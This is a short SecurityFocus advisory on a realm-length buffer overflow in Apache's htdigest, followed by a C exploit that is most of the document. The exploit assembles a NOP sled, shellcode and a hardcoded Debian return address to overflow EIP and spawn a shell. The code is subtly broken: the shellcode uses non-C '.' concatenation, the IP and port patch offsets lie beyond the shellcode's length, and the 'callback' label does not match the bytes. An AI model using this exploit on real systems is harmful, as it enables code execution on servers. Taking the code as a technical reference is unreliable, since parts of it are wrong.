source: http://www.securityfocus.com/bid/13537/info

A buffer overflow vulnerability exists in the htdigest utility included with Apache. The vulnerability is due to improper bounds checking when copying user-supplied realm data into local buffers.

By supplying an overly long realm value to the command line options of htdigest, it is possible to trigger an overflow condition. This may cause memory to be corrupted with attacker-specified values.

This issue could be exploited by a remote attacker; potentially resulting in the execution of arbitrary system commands within the context of the web server process. 

#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

/********************************************************************************/

#define IP "127.1.1.1"
#define PORT 1337

unsigned int addys[] = { 0xbffffadd, // debian 3.1
                        };
// which address to use
#define ADDY 0

/*******************************************************************************/


// Point Of EIP - The ammount of data we must write to completely overflow eip
#define POE 395

// netric callback shellcode
char cb[] =
        "\x31\xdb\x6a\x17\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68".
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

#define IP_OFFSET       33
#define PORT_OFFSET     39

void changeip(char *ip);
void changeport(char *code, int port, int offset);

int main (void) {
        char buff[416];
        int a;

        changeip(IP);
        changeport(cb, PORT, PORT_OFFSET);

        for (a = 0; a < 200; a++)
                *(buff+a) = 0x90;

        for (int b = 0; *(cb+b); a++, b++)
                *(buff+a) = *(cb+b);

        for (; a + 4 <= POE; a += 4)
                memcpy(buff+a, (addys+ADDY), 4);

        *(buff+a) = 0;

        fwrite(buff, strlen(buff), 1, stdout);
        return(0);
}

// ripped from some of snooq's code
void changeip(char *ip) {
       char *ptr;
       ptr=cb+IP_OFFSET;
       /* Assume Little-Endianess.... */
       *((long *)ptr)=inet_addr(ip);
}

// ripped from some of snooq's code
void changeport(char *code, int port, int offset) {
        char *ptr;
        ptr=code+offset;
        /* Assume Little-Endianess.... */
        *ptr++=(char)((port>>8)&0xff);
        *ptr++=(char)(port&0xff);
}



